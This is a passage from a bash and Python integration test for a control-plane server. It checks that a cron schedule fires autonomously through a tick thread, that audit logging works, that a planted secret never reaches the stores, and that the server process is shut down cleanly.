LIB="$LIB" "$PY" - >"$TICK_OUT" 2>"$WORK/tick.err" <<'PYEOF'
import json, os, sys, time, threading, socket, http.server
import urllib.request, urllib.error
sys.path.insert(0, os.environ["LIB"])
sys.path.insert(0, os.environ["WORK"])  # so `import wired_client` (the reused signer) resolves.
import cp_auth as K
import cp_server as S
import cp_boot
import cp_audit as Au
import wired_client  # the reused signer (drives signed requests to our in-proc server).

# an ISOLATED home for the tick proof (its own clock + store). The scheduler routes are
# home-FREE (§6 — they resolve home per-call from HEIMDALL_HOME), so we POINT the env at
# this home BEFORE creating the schedule, so the route's create_schedule writes where
# due_schedules/tick read. boot + tick are passed home explicitly to the same root.
home = os.path.join(os.environ["WORK"], "tickhome")
os.makedirs(home, exist_ok=True)
os.environ["HEIMDALL_HOME"] = home  # the home-free scheduler routes resolve home from here.
out = {}

# register an OWNER identity (the tick driver fires schedules AS the registered owners).
owner = "haid:rj.tickowner"
priv, pub = K.generate_keypair()
K.register_key(owner, pub, owner=True, home=home)

# bind a free port + start the WIRED handler in a background thread.
sock = socket.socket(); sock.bind(("127.0.0.1", 0)); port = sock.getsockname()[1]; sock.close()
httpd = http.server.HTTPServer(("127.0.0.1", port), S._build_handler_class(home, False))
threading.Thread(target=httpd.serve_forever, daemon=True).start()
time.sleep(0.2)

# BOOT the SAME assembly cp_server.serve() uses — but with the tick clock OFF here, so we
# can start it explicitly with a SHORTENED interval (the start_tick_thread knob). resume
# off for determinism. This is the production boot() path, only the clock cadence differs.
cp_boot.boot(home=home, start_tick=False, resume=False)

# point the reused signer at THIS server + identity.
os.environ["CP_PORT"] = str(port)
os.environ["CP_HAID"] = owner
os.environ["CP_PRIV"] = priv


def call(method, path, body=b""):
    return wired_client.request(method, path, body, haid=owner, priv=priv)


# create a schedule DUE NOW over signed POST /schedules. "* * * * *" is due every minute,
# so the very next tick fires it. sync-queue is allowlisted + non-gated (fires without
# an approval), so its autonomous dispatch is a clean 200 we can find in the audit log.
sched_body = json.dumps({
    "action_type": "sync-queue",
    "params": {"queue": "issue"},
    "cron": "* * * * *",
    "enabled": True,
}).encode()
st_create, b_create = call("POST", "/schedules", sched_body)
out["create_status"] = st_create
out["schedule_id"] = b_create.get("schedule_id")

# count autonomous dispatch rows for sync-queue BEFORE the clock turns.
before = len(Au.search(event="dispatch", action_type="sync-queue", home=home))
out["dispatch_before"] = before

# START the tick clock with a SHORTENED interval (0.5s) — the production driver, faster.
# A list captures what each autonomous tick fired (proving the CLOCK, not a manual call).
fired_log = []
thread, stop = cp_boot.start_tick_thread(
    home=home, interval=0.5, on_tick=lambda fired: fired_log.extend(fired))
out["tick_thread_started"] = thread is not None

# wait several intervals for an autonomous tick to land the due schedule's dispatch AND
# for the tick driver's on_tick callback to report it (the run-log proof just below). These
# are TWO DIFFERENT observations of the SAME tick, not one: the audit write happens INSIDE
# run_tick() (cp_boot.py), but on_tick() only fires once run_tick() fully RETURNS — which
# includes an unconditional, lazily-first-imported `import cp_maintainer_runner` AFTER the
# dispatch loop (cp_boot.run_tick). On an idle box that gap is sub-millisecond and never
# observable at this loop's 0.25s poll granularity; under real system load (e.g. a parallel
# test sweep) it can stretch past it — the audit condition trips, the loop used to break
# immediately, and `fired_log` was read before on_tick had run (a confirmed reproduction:
# an injected delay at that exact point in run_tick reproduces this suite's flake byte for
# byte). So the wait stays open, on the SAME bounded deadline, until BOTH conditions hold —
# a real bounded wait-for-condition, not a fixed sleep, and no weakening of the assertion:
# if on_tick genuinely never reports it, the loop still times out and the check still fails.
deadline = time.time() + 12
after = before
fired_sync_queue = False
while time.time() < deadline:
    after = len(Au.search(event="dispatch", action_type="sync-queue", home=home))
    fired_sync_queue = any(f.get("action_type") == "sync-queue" for f in fired_log)
    if after > before and fired_sync_queue:
        break
    time.sleep(0.25)
out["dispatch_after"] = after
out["autonomous_fired"] = len(fired_log)
out["fired_sync_queue"] = fired_sync_queue

if stop is not None:
    stop.set()
httpd.shutdown(); httpd.server_close()
sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$TICK_OUT" ] || { bad "#7 the tick harness produced no output"; cat "$WORK/tick.err" >&2; }
tjget() { "$PY" -c "import json;print(json.load(open('$TICK_OUT')).get('$1'))" 2>/dev/null; }

[ "$(tjget create_status)" = "200" ] \
  && ok "#7 a schedule due-now was created over signed POST /schedules ($(tjget schedule_id))" \
  || bad "#7 the due schedule was not created (status $(tjget create_status))"
[ "$(tjget tick_thread_started)" = "True" ] \
  && ok "#7 the cp_boot tick driver thread STARTED (the autonomous per-interval clock)" \
  || bad "#7 the tick driver thread did not start"
TICK_BEFORE="$(tjget dispatch_before)"; TICK_AFTER="$(tjget dispatch_after)"
[ "${TICK_AFTER:-0}" -gt "${TICK_BEFORE:-0}" ] 2>/dev/null \
  && ok "#7 the due schedule FIRED autonomously -> its dispatch landed in the audit log ($TICK_BEFORE -> $TICK_AFTER, NO manual client)" \
  || bad "#7 the scheduler tick did not fire the due schedule ($TICK_BEFORE -> $TICK_AFTER)"
[ "$(tjget fired_sync_queue)" = "True" ] \
  && ok "#7 the tick driver's run log shows it fired the sync-queue dispatch (the clock turned)" \
  || bad "#7 the tick run log did not record the autonomous dispatch"

# ──────────────────────────────────────────────────────────────────────────────
# FOOTER — the planted runtime-assembled secret never entered any store; the server
# subprocess is reaped; the gate verdict. Exit 0 = the whole WIRED flow holds.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "FOOTER — no-secret over the stores + server reaped + verdict"

# the RUNTIME-ASSEMBLED secret was never ingested into the flow, so it must be ABSENT
# from every control-plane store on disk (the no-secret boundary holds end-to-end).
if grep -rqF "$PLANTED_SECRET" "$CP_HOME" 2>/dev/null; then
  bad "FOOTER the planted secret is present somewhere under the control-plane store tree"
else
  ok "FOOTER the runtime-assembled secret is absent from EVERY control-plane store (grep over the tree)"
fi

# reap the server subprocess (the trap also kills it; assert it stops cleanly here).
if [ -n "$SERVER_PID" ]; then
  # disown first so bash job-control prints no async "Terminated" notice on the kill.
  disown "$SERVER_PID" 2>/dev/null || true
  kill "$SERVER_PID" 2>/dev/null || true
  for _ in $(seq 1 20); do kill -0 "$SERVER_PID" 2>/dev/null || break; sleep 0.1; done
  kill -0 "$SERVER_PID" 2>/dev/null && kill -9 "$SERVER_PID" 2>/dev/null || true
  wait "$SERVER_PID" 2>/dev/null || true
  if kill -0 "$SERVER_PID" 2>/dev/null; then
    bad "FOOTER the wired server subprocess did not stop"
  else
    ok "FOOTER the wired server subprocess was reaped (no orphan server)"
    SERVER_PID=""
  fi
fi

echo
echo "============================================================"
printf "cp-wired: %d passed, %d failed\n" "$PASS" "$FAIL"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
